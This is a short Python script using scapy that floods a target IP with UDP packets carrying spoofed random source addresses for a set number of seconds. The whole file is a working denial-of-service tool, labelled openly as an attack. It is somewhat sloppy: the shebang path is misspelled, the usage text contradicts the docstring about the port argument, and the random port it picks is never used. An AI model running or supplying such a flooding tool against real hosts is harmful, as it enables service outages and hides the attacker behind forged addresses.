#!/ust/bin/python3
"""
Send UDP flood with spoofed source IPs.
Usage : ./flood_udp <ip> <port> <second>
"""
import time
import socket
import random
import sys
from scapy.all import *

def usage():
	print(f"Usage: python3 {sys.argv[0]} <ip> <seconds of attack>")

def flood(victim_ip, duration):
	timeout = time.time() + duration
	sent_packets = 0

	print(f"Attacking {victim_ip} for {duration} seconds")
	while time.time() < timeout:
		# pick a random port and send the packet
		victim_port = random.randint(1025, 65356)
		packet = IP(src=RandIP()._fix(), dst=victim_ip) / UDP()
		send(packet)
		sent_packets += 1
		#print(f"Packet sent at the port {victim_port}")
	print(f"Attack finished. Sent {sent_packets} packets.")

def main():
	if len(sys.argv) != 3:
		usage()
		exit(1)
	
	ip_addr = sys.argv[1]
	duration = sys.argv[2]
	# do we need the port at all? Can't we randomize it? Check
	flood(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
	main()
